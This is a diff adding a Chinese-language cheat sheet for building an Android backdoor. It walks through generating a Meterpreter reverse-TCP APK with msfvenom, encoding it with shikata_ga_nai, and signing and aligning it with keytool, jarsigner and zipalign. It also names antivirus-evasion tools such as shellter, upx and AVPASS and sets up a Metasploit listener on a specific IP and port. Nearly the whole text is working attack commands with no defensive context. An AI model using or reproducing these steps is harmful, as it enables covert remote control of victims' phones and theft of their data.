@@ -1,0 +1,35 @@
+﻿backdoor:
+	生成:
+		msfvenom：
+		msfvenom -p android / meterpreter / reverse_tcp LHOST =（机器IP kali）LPORT =（端口号）R> .apk
+		-e x86/shikata_ga_nai //采用shikata_ga_na编码加密
+	签名：
+		Keytool
+			keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+			创建密钥库
+			-genkey 产生证书文件
+			-keystore 指定密钥库的.keystore文件中
+			-keyalg 指定密钥的算法,这里指定为RSA(非对称密钥算法)
+			-validity 为证书有效天数，这里我们写的是10000天
+			-alias 产生别名
+			-verbose：指定生成详细输出
+			-keystore：指定数字证书存储路径
+			-signedjar：该选项的三个参数为 签名后的apk包 未签名的apk包 数字证书别名(注意顺序)
+		jarsigner
+			jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore APPNAME.apk aliasname` 
+		JARsigner验签名
+			jarsigner -verify -verbose -certs APPNAME.apk
+	优化：
+		zipalign（andriod 优化工具->对齐）
+		zipalign -v 4 APPNAME.apk NEWAPPNAME.apk
+	压缩/免杀：
+		windows_exe：shellter   upx Avet   Vei
+		andriod:AVPASS
+	注入：
+	监听：
+	use exploit/multi/handler
+	set payloads android/meterpreter/reverse_tcp 
+	set LHOST 192.168.199.179
+	set LPORT  44444
+	exploit
+	后续：
